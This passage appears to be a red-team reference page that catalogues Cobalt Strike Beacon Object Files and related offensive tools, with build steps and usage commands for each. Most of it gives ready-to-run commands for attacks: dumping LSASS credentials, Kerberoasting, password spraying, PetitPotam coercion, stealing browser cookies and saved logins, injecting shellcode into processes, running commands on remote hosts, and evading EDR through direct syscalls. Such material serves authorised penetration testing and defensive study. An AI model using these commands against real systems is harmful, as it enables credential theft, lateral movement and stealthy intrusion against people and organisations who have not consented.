`- **<path to program>**: `Full path to the program to execute.



`runas "AlternateUser" "DOMAIN" "Password123" "C:\Path\To\Program.exe"`

#### SetEnv

Sets or modifies a system environment variable.

`- **<variable name>**: `Name of the environment variable.
`- **<value>**: `Value to set for the environment variable.



`setenv "PATH" "C:\MyApp\Bin;%PATH%"`

#### SetProxy

Sets or modifies the system's proxy settings.

`- **<proxy server>**: `Address of the proxy server.
`- **<port>**: `Port number for the proxy.



`setproxy "proxy.example.com" 8080`

#### SetRegistry

Sets or modifies a registry key or value.

`- **<registry path>**: `Full path to the registry key or value.
`- **<value>**: `Value to set for the registry entry.



`setregistry "HKEY_LOCAL_MACHINE\SOFTWARE\MyCompany\MyApp" "LicenseKey" "ABCDEF123456"`

#### SpoofMAC

Changes the MAC address for a specified network adapter.

`- **<adapter name>**: `Name of the network adapter.
`- **<new MAC>**: `New MAC address to set.



`spoofmac "Ethernet Adapter" "DE-AD-BE-EF-CA-FE"`

#### StartService

Starts a specified service.

`- **<service name>**: `Name of the service to start.



`startservice "MyService"`

#### StopService

Stops a specified service.

`- **<service name>**:` Name of the service to stop.



`stopservice "MyService"`

#### SyscallHook

Hooks a system call to monitor or modify its behavior.

`- **<syscall number/name>**: `System call identifier.
`- **<path to hook handler>**: `Path to the hook handler binary.



`syscallhook NtCreateFile "C:\Path\To\HookHandler.dll"`

#### UploadFile

Uploads a file to a remote server.

`- **<local path>**: `Path to the local file to upload.
`- **<remote URL>**: `URL of the server to upload to.
`- **<POST/PUT>**:` HTTP method to use for the upload.



`uploadfile "C:\Path\To\File.txt" "http://example.com/upload" POST`

#### WipeFile

Securely deletes a file from the filesystem.

`- **<path to file>**: `Path to the file to be wiped.



`wipefile "C:\Path\To\SecretFile.txt"`


https://github.com/REDMED-X/OperatorsKit/


#### BOF-Quser

An implementation of the `quser` command as a Beacon Object File (BOF) using the Windows API to query session information on a local or remote system.

bash

`Usage: bof-quser <target ip/hostname>`


https://github.com/netero1010/Quser-BOF




#### InlineWhispers

A tool to facilitate the use of direct system calls in Cobalt Strike's Beacon Object Files (BOFs) to evade common security product hooks that monitor Win32 API functions.

**What is this repository for?** To demonstrate the ability to make direct syscalls from within BOFs, enhancing the stealth of the operations by avoiding hooked API calls.

**How do I set this up?**

- **SysWhispers Setup (Optional):**
    
    - Clone the SysWhispers repository for generating syscall stubs:
        
        bash
        
        `git clone https://github.com/jthuraisamy/SysWhispers.git cd SysWhispers pip3 install -r requirements.txt py syswhispers.py --versions 7,8,10 -o syscalls`
        
        This will create the initial `syscalls.asm` and `syscalls.h` files.
- **InlineWhispers Setup:**
    
    - Clone the InlineWhispers repository and prepare the syscall files:
        
        bash
        
        `git clone https://github.com/<InlineWhispers-repo-url>.git cd InlineWhispers`
        
    - Edit `functions.txt` to specify the necessary functions from `syscalls.asm`.
    - Generate the inline assembly header file:
        
        
        
        `python3 InlineWhispers.py`
        
    - Prune `Syscalls.h` to remove functions not used.
    - Include the generated `syscalls-asm.h` in your BOF project:
        
        c
        
        `#include "syscalls-asm.h"`
        
        This will allow your BOF to make direct system calls.

https://github.com/outflanknl/InlineWhispers



#### AddMachineAccount BOF

A collection of BOFs for interacting with Active Directory machine accounts, which can be used for legitimate domain enumeration and maintenance, or for red team engagements within the scope of an authorized assessment.

- **GetMachineAccountQuota**: Retrieves the domain's machine account creation quota.
- **AddMachineAccount**: Creates a new machine account in the domain.
- **DelMachineAccount**: Deletes a machine account from the domain.

**How to compile:**



`# Install Mingw-w64 sudo apt-get install mingw-w64 # Compile the BOF cd SOURCE make`

**Usage:**



`# Import the CNA script in Cobalt Strike MachineAccounts.cna # Execute commands within a beacon GetMachineAccountQuota AddMachineAccount <Computername> [Optional Password] DelMachineAccount <Computername>`

#### Askcreds BOF

Leverages the CredUIPromptForWindowsCredentials API to prompt for user credentials within the context of the current user.

**How to compile:**



`# Install Mingw-w64 sudo apt-get install mingw-w64 # Compile the BOF cd SOURCE make`

**Usage:**



`# Import the CNA script in Cobalt Strike Askcreds.cna # Execute commands within a beacon Askcreds [optional reason]`

#### Domaininfo BOF

Extracts domain information from Active Directory Domain Services without using PowerShell or other tools that might trigger alerts.

**How to compile:**



`# Install Mingw-w64 sudo apt-get install mingw-w64 # Compile the BOF cd SOURCE make`

**Usage:**



`# Import the CNA script in Cobalt Strike Domaininfo.cna # Execute commands within a beacon Domaininfo`

#### FindObjects BOF

Identifies processes with specific loaded modules or handles, helping to select more OPSEC-safe processes for certain actions.

**How to compile:**



`# Install Mingw-w64 sudo apt-get install mingw-w64 # Compile the BOF cd SOURCE make`

**Usage:**



`# Import the CNA script in Cobalt Strike FindObjects.cna # Execute commands within a beacon FindModule example.dll FindProcHandle example.exe`

#### KerbHash BOF

Hashes passwords to various Kerberos key formats without calling Windows API functions directly, potentially evading certain security measures.

**How to compile:**



`# Install Mingw-w64 sudo apt-get install mingw-w64 # Compile the BOF cd SOURCE make`

**Usage:**



`# Import the CNA script in Cobalt Strike KerbHash.cna # Execute commands within a beacon KerbHash <password> <username> <domain.fqdn>`

**Examples:**



`KerbHash Welcome123 adminuser domain.local KerbHash Welcome123 SERVER$ domain.local`

### Kerberoast BOF

A Beacon Object File (BOF) for listing SPN-enabled accounts or requesting Kerberos TGS tickets for offline cracking.

- **How to Compile:**
    
    - Install Mingw-w64 and mingw-w64-binutils.
    - Navigate to the `SOURCE` folder.
    - Execute `make` to compile.
    - Import `Kerberoast.cna` via Cobalt Strike Script Manager.
    - Install Python dependencies: `pip install -r requirements.txt`.
- **Usage:**
    
    - Import script, then use commands in a beacon.
    - `Kerberoast list`: List SPN-enabled accounts.
    - `Kerberoast list-no-aes`: List without AES encryption.
    - `Kerberoast roast`: Request TGS for all accounts.
    - `Kerberoast roast-no-aes`: Request without AES encryption.
    - `Kerberoast roast svc-test`: Request for specific account.
    - Convert tickets to Hashcat format using `TicketToHashcat.py`.
    - Crack hashes with Hashcat (`-m 13100`, `-m 19600`, `-m 19700`).

---

### Klist BOF

Displays or purges cached Kerberos tickets on the target system.

- **How to Compile:**
    
    - Install Mingw-w64 and mingw-w64-binutils.
    - Navigate to the `SOURCE` folder.
    - Execute `make` to compile.
    - Import `Klist.cna` via Cobalt Strike Script Manager.
- **Usage:**
    
    - `klist`: Show cached tickets.
    - `klist purge`: Purge cached tickets.
    - `klist get SPN`: Get a ticket for specific SPN.

---

### Lapsdump BOF

Dumps LAPS passwords for specified computers within Active Directory.

- **How to Compile:**
    
    - Install Mingw-w64 and mingw-w64-binutils.
    - Navigate to the `SOURCE` folder.
    - Execute `make` to compile.
    - Import `Lapsdump.cna` via Cobalt Strike Script Manager.
- **Usage:**
    
    - `Lapsdump [Computername]`: Dump LAPS password for the computer.

---

### PetitPotam BOF

Executes the PetitPotam attack, coercing Windows hosts to authenticate to other systems via MS-EFSRPC.

- **How to Compile:**
    
    - Install Mingw-w64 and mingw-w64-binutils.
    - Navigate to the `SOURCE` folder.
    - Execute `make` to compile.
    - Import `PetitPotam.cna` via Cobalt Strike Script Manager.
- **Usage:**
    
    - `PetitPotam [capture server] [target server]`: Perform PetitPotam attack.
    - Use with relaying tools for additional exploits.

---

### Psc BOF

Shows detailed information about processes with established TCP and RDP connections.

- **How to Compile:**
    
    - Install Mingw-w64 and mingw-w64-binutils.
    - Navigate to the `SOURCE` folder.
    - Execute `make` to compile.
    - Import `Psc.cna` via Cobalt Strike Script Manager.
- **Usage:**
    
    - `psc`: Execute to show process connection details.

---

### Psk BOF

Provides details on Windows kernel, loaded driver modules, and summaries of installed security products.

- **How to Compile:**
    
    - Install Mingw-w64 and mingw-w64-binutils.
    - Navigate to the `SOURCE` folder.
    - Execute `make` to compile.
    - Import `Psk.cna` via Cobalt Strike Script Manager.
- **Usage:**
    
    - `psk`: Display kernel and driver security information.


#### Psm BOF

Process information gathering tool for Cobalt Strike.

**Compile:**



`# Ensure Mingw-w64 is installed cd SOURCE make # Import Psm.cna in Cobalt Strike`

**Usage:**



`psm [processid]`

#### Psw BOF

Tool for displaying Window titles from processes with active windows.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import Psw.cna in Cobalt Strike`

**Usage:**




`psw`

#### Psx BOF

Process and security product information tool for Cobalt Strike.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import Psx.cna in Cobalt Strike`

**Usage:**




`psx psxx # For more details`

#### ReconAD BOF

Active Directory querying tool via ADSI API.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import ReconAD.cna in Cobalt Strike`

**Usage:**




`# Custom LDAP filter ReconAD [filter] [attributes] [max results] [-usegc|-ldap] [server:port] # Users ReconAD-Users [username] [attributes] [max results] [-usegc|-ldap] [server:port] # Computers ReconAD-Computers [computername] [attributes] [max results] [-usegc|-ldap] [server:port] # Groups ReconAD-Groups [groupname] [attributes] [max results] [-usegc|-ldap] [server:port]`

#### Smbinfo BOF

Remote system information gathering tool using NetWkstaGetInfo API.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import Smbinfo.cna in Cobalt Strike`

**Usage:**




`Smbinfo [Computername]`

#### SprayAD BOF

Password spraying attack tool for Active Directory.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import SprayAD.cna in Cobalt Strike`

**Usage:**




`SprayAD [password] [filter] [ldap]`

#### StartWebClient BOF

Starts the WebClient service using a service trigger.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import StartWebClient.cna in Cobalt Strike`

**Usage:**




`StartWebClient`

#### WdToggle BOF

Tool to enable WDigest credential caching and bypass Credential Guard.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import WdToggle.cna in Cobalt Strike`

**Usage:**




`WdToggle`

#### Winver BOF

Displays the Windows version, build number, and update build revision.

**Compile:**




`# Ensure Mingw-w64 is installed cd SOURCE make # Import Winver.cna in Cobalt Strike`

**Usage:**




`Winver`


#### PetitPotam Authentication Attack

Reflective DLL implementation of the PetitPotam attack for remotely coercing Windows hosts to authenticate to arbitrary systems via the MS-EFSRPC protocol. It's designed to integrate with C2 frameworks like Cobalt Strike and can relay NTLM authentication to potentially gain Domain Admin privileges.

**Compilation:**

1. Windows with Visual Studio 2019+ required.
2. Navigate to the SOURCE folder within the PetitPotam tool directory.
3. Open PetitPotam.sln in Visual Studio.
4. Build in Release mode for x64.
5. DLL is in the PetitPotam folder post-build.

**Usage:**

- Load with Cobalt Strike Script Manager.
- Set up NTLM relaying.
- Execute attack: `PetitPotam [capture server] [target server]`

#### RemotePipeList

Tool to enumerate named pipes on a remote system, useful for identifying potential IPC endpoints for further exploitation or information gathering.

**Usage Directly:**

- Command: `remotepipelist <target> <(domain\)username> <password>`

**Cobalt Strike Integration:**

- Load the provided CNA script using Script Manager, with the .exe in the same directory.
- If using Stage1, place the python file in the shared/tasks folder and restart Stage1 server.

**Background Info:**

- Remote pipe listing is typically more complex; this tool facilitates it for use through implants.
- More details: [Outflank Blog on Remote Named Pipes](https://outflank.nl/blog/2023/10/19/listing-remote-named-pipes/).

https://github.com/outflanknl/C2-Tool-Collection/


#### MiniDumpWriteDump BOF (64-bit only)

A custom Beacon Object File (BOF) implementation that mimics the functionality of the MiniDumpWriteDump function for memory dumps. It uses statically compiled syscalls for critical functions, offering stealthier operation by avoiding API calls that are commonly hooked for detection.

**Usage in Cobalt Strike's Beacon:**

- Command: `minidumpwritedump [process_id] [destination_path]`
    - Example: `beacon> minidumpwritedump 756 C:\lsass.dmp`

**Output Example:**

- Initiating the dump will provide feedback on the operation.

less

`[*] Static Syscalls Custom MiniDumpWriteDump BOF (@rookuu_) [+] host called home, sent: 12165 bytes [+] received output: OS Version: 10.0.18362 [+] received output: Done! Enjoy the creds. (C:\lsass.dmp)`


https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump


#### HalosGate Processlist Cobalt Strike BOF

Utilizes a custom syscaller based on HalosGate & HellsGate technique to enumerate processes on the target system. If no EDR hooks are detected, defaults to using HellsGate. Verbose mode is available for debugging purposes.

**Compile Instructions:**

- Use x64 MinGW for compilation.
    - Command: `x86_64-w64-mingw32-gcc -c halosgate-ps.x64.c -o halosgate-ps.x64.o -masm=intel`

**Usage in Cobalt Strike:**

- Import the `halosgate-ps.cna` script into Cobalt Strike's Script Manager.
- Execute the command in the Beacon Console:
    - `beacon> halosgate-ps`

**Example Output:**



`[*] HalosGate Processlist BOF [+] host called home, sent: 3232 bytes    PID    PPID    Name    ---    ----    ----    ...`

#### PPLFault

A tool by Gabriel Landau exploiting a timing issue in Windows Code Integrity for arbitrary code execution to dump processes protected by Windows Defender.

**Example Usage:**

- Check the version and process list in PowerShell:
    - `cmd /c ver`
    - `tasklist | findstr lsass`
- Execute PPLFault to dump a process:
    - `.\PPLFault.exe -v 992 lsass.dmp`

**Example Output:**



 `[+] No cleanup necessary.  [+] Dump saved to: lsass.dmp  [+] Operation took 937 ms`

- Check for the dump file:
    - `dir *.dmp`


https://github.com/gabriellandau/PPLFault

#### GodFault

Leverages the same vulnerability as PPLFault to gain "God Mode" access, including opening `\Device\PhysicalMemory`.

**Example Usage:**

- Run GodFault to escalate privileges:
    - `C:\Users\user\Desktop>GodFault.exe -v`

**Example Output:**



 `[+] Testing post-exploit ability to acquire PROCESS_ALL_ACCESS to System: Success  [+] Opened \Device\PhysicalMemory.  Handle is 0x1b4`



https://github.com/boku7/halosgate-ps


#### ScreenShot-BOF

An in-memory screenshot utility for Cobalt Strike that avoids spawning new processes or injecting code.

**Compilation Instructions:**

- Use the appropriate "VS20xx x64 or x86 Cross Tools Command Prompt".
- Run `build.bat`.

**Usage in Cobalt Strike:**

- To execute, use the inline-execute command with the compiled object file:
    - `inline-execute pass-to-screenshot.o`



https://github.com/qwqdanchun/ScreenShot-BOF



#### Defender Exclusions BOF

**What**: This BOF is used to identify Windows Defender's configured exclusions, which may include certain extensions, processes, and folders.

**Why**: It serves as an example of using the C++ compiler to create BOFs efficiently, bypassing the need for vtable dereferences.

**Building**:



`cd src make all`

**Usage**:

1. Load `dist/cEnumerateDefender.cna` into Cobalt Strike.
2. Run the command in a Beacon:
    

    
    `cEnumDefenderException [1-3]`
    

**Options**:

- `1` for Extensions
- `2` for Processes
- `3` for Folders



https://github.com/EspressoCake/Defender_Exclusions-BOF



#### ChromiumKeyDump

**Description**: A BOF to extract Chrome/Edge Masterkeys and retrieve Cookie/Login Data files.

**Compilation** (Visual Studio):

- **x86**:
    

    
    `"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars32.bat" cl.exe /c /GS- /TP BOF.cpp /FoBOF.o`
    
- **x64**:
        
    `"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" cl.exe /c /GS- /TP BOF.cpp /FoBOF.x64.o`
    

**Compilation** (MinGW):

- **x86**:
    

    
    `i686-w64-mingw32-gcc -c BOF.cpp -o BOF.o`
    
- **x64**:
    

    
    `x86_64-w64-mingw32-gcc -c BOF.cpp -o BOF.x64.o`
    

**Usage**:

- Place the compiled `.o` files into the `bin` folder.
- Load the `.cna` files into Cobalt Strike.

**Commands**:



`chromiumkeydump [edge|chrome] [masterkey|cookies|logindata|all] [ChromePath(optional)]`

**Arguments**:

- `masterkey`: Dump Masterkey
- `cookies`: Download Cookies file
- `logindata`: Download Login Data file
- `all`: Perform all actions

**Example Path**:

- `C:\\Users\\USER\\AppData\\Local`
- `D:\\Programs\\`

#### Sleeper

**Description**: This BOF utilizes the `SetThreadExecutionState` function to manage the host's sleep state.

**Usage**:



`sleeper [off|on|force]`

**Arguments**:

- `off`: Return to default sleep settings.
- `on`: Prevent the system from entering sleep mode.
- `force`: Prevent sleep even if the sleep button is pressed.

**Reference**:

- Microsoft Documentation on `SetThreadExecutionState`.



https://github.com/crypt0p3g/bof-collection/tree/main




# CredBandit Cheat Sheet

## Overview

CredBandit is a tool for memory dumping via Cobalt Strike Beacon Object Files (BOFs), avoiding disk writes by leveraging NTFS transactions.

## References

- Direct Syscalls and sRDI: [@Cneelis](https://twitter.com/Cneelis)
- TransactedSharpMiniDump, InlineWhsipers: Various authors
- MiniDump BOF adaptation: [@rookuu_](https://twitter.com/rookuu_)
- SysWhispers for syscall generation: [@Jackson_T](https://twitter.com/Jackson_T)
- Native download functionality: [@BinaryFaultline](https://twitter.com/BinaryFaultline), [@Cr0Eax](https://twitter.com/Cr0Eax), and [@EthicalChaos](https://twitter.com/_EthicalChaos_)

## Getting Started

1. Place `credBandit` folder above `cobaltstrike` directory.
2. Load `MiniDumpWriteDump.cna` script.
3. Execute `credBandit` on target process, e.g., LSASS.
4. Retrieve dump from Downloads console.

## Build Command



`x86_64-w64-mingw32-gcc -o credBanditx64.o -c credBandit.c -masm=intel`

## Usage

Perform memory dump on a high-integrity process, e.g., LSASS, and download over C2 channel.



`beacon> credBandit <PID> [output]`

## Syntax Example


`beacon> credBandit 708 output # Output will include various success messages and initiate the download of the memory dump.`

# Detect-Hooks Cheat Sheet

## Overview

Detect-Hooks identifies userland API hooks placed by AV/EDR using a Beacon Object File (BOF).

## References

- Detecting Hooked Syscalls: [@spotheplanet](https://twitter.com/spotheplanet)

## Getting Started

1. Copy `Detect-Hooks` folder to the system.
2. Load `detect-hooks.cna` script.
3. Run `detect-hooks` to list detected hooks.

## Build Command



`cl.exe /c detect-hooks.c /GS- /Fodetect-hooksx64.o`

## Usage

Identify active AV/EDR hooks in memory.



`beacon> detect-hooks # Output will list API hooks or indicate none were detected.`

# HOLLOW Cheat Sheet

## Overview

HOLLOW is a BOF for Cobalt Strike that performs Early Bird injection to execute shellcode in a remote process.

## Authors

- Bobby Cooke (@0xBoku)
- Justin Hamilton (@JTHam0)
- Octavio Paguaga (@OakTree__)
- Matt Kingstone (@n00bRage)

## Usage

1. Compile using MinGW.
2. Import `hollow.cna` into Cobalt Strike.
3. Run `hollow` with appropriate paths.

## Command Example



`beacon> hollow svchost.exe /path/to/shellcode.bin`

# SCShell Cheat Sheet

## Overview

SCShell modifies service binary paths to execute commands without dropping files or creating new services, leveraging ChangeServiceConfigA.

## Usage



`SCShell.exe <target> <service> <payload> <domain> <username> <password>`

## Example



`SCShell.exe 192.168.1.100 XblAuthManager "cmd.exe /c path\to\payload.exe" . admin pass`

# WinRMDLL Cheat Sheet

## Overview

WinRMDLL is a tool for leveraging the WinRM C++ API to execute commands on a remote system with or without credentials.

## Usage

Load the provided Aggressor Script into Cobalt Strike and use the `windll` command.

## Command Examples


`windll <target> <command>`

# DLL Hijack Search Order BOF Cheat Sheet

## Overview

This BOF searches for a DLL in the safe search order, checks for a writable handle, and alerts if possible to overwrite.

## Usage



`# With compiled object file from 'dist' directory # Or compile with command: # x86_64-w64-mingw32-gcc -c source.c -o output.o # In Cobalt Strike beacon> dllsearchorderbof <start_path> <dll_name>`

Please replace placeholder values like `<PID>`, `<target>`, `<service>`, etc., with actual values for your specific use case.



#### ThreadlessInject BOF

A Beacon Object File (BOF) that employs @_EthicalChaos_'s ThreadlessInject technique for process injection without using new threads, through direct NTAPI function calls and API hashing. Originally unveiled at BSides Cymru 2023.

##### Usage:



`threadless-inject <pid> <dll> <export function> <shellcode path>`

##### Examples:

- Inject into chrome.exe, trigger shellcode at process termination:



`threadless-inject 1234 ntdll.dll NtTerminateProcess shellcode.bin`

- Inject into notepad.exe, trigger on file open:



`threadless-inject 1234 ntdll.dll NtOpenFile shellcode.bin`

##### Source:

[ThreadlessInject-BOF on GitHub](https://github.com/iilegacyyii/ThreadlessInject-BOF)

---

#### ASRenum

A tool for identifying Attack Surface Reduction (ASR) rules, their actions, and exclusion paths, with credits to EspressoCake.

##### Build and Load:


`$ make all load cna`

##### Files:

- `ASRenum-BOF.cpp/.cna` - initial script
- `ASRenum.cs` - pending test for BOF.NET implementation

##### Screenshot:

Taken on 2022-12-28 at 14:05:34, demonstrating the tool in action.


##### Source:

[ASRenum-BOF on GitHub](https://github.com/mlcsec/ASRenum-BOF)

----

#### Inline-Execute-PE for Cobalt Strike


A toolkit for Cobalt Strike that allows loading and executing unmanaged Windows executables in memory without writing to disk. Particularly designed for x64 Beacons and executables compiled with Mingw or Visual Studio. This avoids detection and facilitates the use of tools like Mimikatz in-memory.

**Target-facing Commands:**

- `peload`: Load a PE file into Beacon's memory.
- `perun`: Execute a loaded PE file with provided command line arguments.
- `peunload`: Remove a PE file from Beacon's memory.

**Internal Data-Structure Commands:**

- `petable`: Display loaded PEs in Beacons.
- `peconfig`: Configure Inline-Execute-PE options (Timeout, UnloadLibraries).
- `pebroadcast`: Broadcast petable data to all connected CobaltStrike Clients.

---

**peload**

- **Purpose:** Loads a PE into memory and prepares it for execution.
- **Major Actions:**
    - Send PE over the network or specify PE on the target disk.
    - Create a memory structure for operation.
    - Allocate memory with RW protection and write the PE.
    - XOR encrypt the PE in memory.
    - Allocate additional memory for encrypted PE copy.
    - Spawn `conhost.exe` and set up pipes for output capture.

---

**perun**

- **Purpose:** Executes a loaded PE with arguments.
- **Major Actions:**
    - Send arguments to Beacon.
    - XOR decrypt PE in memory.
    - Fix the PE's Import Address Table.
    - Set memory protection to RWX and execute PE.
    - Capture and return output to CobaltStrike.
    - Revert memory changes post-execution.

---

**peunload**

- **Purpose:** Removes a PE from memory.
- **Major Actions:**
    - Close handles and terminate `conhost.exe`.
    - Zero out and free PE memory.
    - Optionally, unload any DLLs loaded by the PE.

---

**petable**

- **Purpose:** Displays information about loaded PEs.
- **Functionality:** Keeps PE data synchronized across all CobaltStrike Clients.

---

**peconfig**

- **Purpose:** Configure Inline-Execute-PE settings.
- **Options:**
    - `Timeout`: Set wait time for PE execution (default 60 seconds).
    - `UnloadLibraries`: Decide whether to unload DLLs after PE execution (default TRUE).

---

**pebroadcast**

- **Purpose:** Manually update all clients with the petable contents.
- **Functionality:** Ensures all clients have synchronized PE data, rarely needed.

https://github.com/Octoberfest7/Inline-Execute-PE





